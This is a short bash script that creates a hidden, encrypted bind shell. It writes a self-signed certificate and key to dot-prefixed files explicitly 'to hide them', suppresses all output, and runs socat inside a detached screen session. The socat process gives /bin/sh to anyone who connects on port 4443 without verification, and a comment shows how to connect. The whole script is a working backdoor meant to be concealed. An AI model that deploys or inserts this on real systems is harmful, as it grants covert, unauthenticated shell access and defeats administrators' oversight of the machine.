#!/bin/bash

# Define file names for the certificate and key with a dot prefix to hide them
cert_file=".server.crt"
key_file=".server.key"

# Generate a private key, suppressing output
openssl genrsa -out "$key_file" 2048 2>/dev/null

# Generate a self-signed certificate, suppressing output
openssl req -new -x509 -key "$key_file" -out "$cert_file" -days 365 -subj "/CN=localhost" 2>/dev/null

# Start a socat shell in a new detached screen session
screen -dmS socat_session socat OPENSSL-LISTEN:4443,cert="$cert_file",key="$key_file",verify=0,fork EXEC:"/bin/sh"


# To connect:
# openssl s_client -connect localhost:4443 -quiet
